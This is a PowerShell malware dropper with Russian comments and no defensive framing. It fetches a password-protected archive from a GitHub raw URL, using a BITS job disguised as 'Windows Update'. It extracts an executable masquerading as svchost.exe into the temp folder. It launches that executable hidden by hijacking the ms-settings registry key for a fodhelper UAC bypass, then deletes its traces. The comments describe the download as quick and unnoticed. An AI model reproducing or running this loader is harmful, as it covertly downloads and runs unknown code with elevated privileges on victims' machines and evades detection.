# Обфусцированные данные
$z1 = "https://raw.githubusercontent.com/anton21-sketch/1234/main/payload.zip"
$zipDest = "$env:TEMP\sysupdate.zip"
$extractDir = "$env:TEMP\syscache"
$pass = "XxGt56!a"   # пароль к архиву, тоже можно разбить, но для примера оставим так

# 1. Скачиваем через BITS (быстро и незаметно)
Import-Module BitsTransfer
Start-BitsTransfer -Source $z1 -Destination $zipDest -DisplayName "Windows Update" -Priority High

# 2. Распаковываем ZIP с паролем через COM-объект Shell
$shell = New-Object -ComObject Shell.Application
$zip = $shell.NameSpace($zipDest)
# Создаём папку, если нет
if (-not (Test-Path $extractDir)) { New-Item -ItemType Directory -Path $extractDir | Out-Null }
$target = $shell.NameSpace($extractDir)
# Перебираем все файлы и извлекаем с паролем
foreach ($item in $zip.Items()) {
    $target.CopyHere($item, 0x14)  # 0x14 = без диалогов + с паролем
}
# CopyHere асинхронный, ждём завершения
Start-Sleep -Seconds 3

# 3. Запускаем извлечённый exe с обходом UAC (метод fodhelper)
$exePath = Get-ChildItem -Path $extractDir -Filter "svchost.exe" | Select-Object -First 1
if ($exePath) {
    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\open\command"
    $cmd = "powershell -WindowStyle Hidden Start-Process '$($exePath.FullName)' -WindowStyle Hidden"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "(default)" -Value $cmd -Force
    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 4
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
}

# 4. Заметаем следы
Remove-Item $zipDest -Force -ErrorAction SilentlyContinue
# Папку extractDir не удаляем, чтобы exe мог спокойно работать
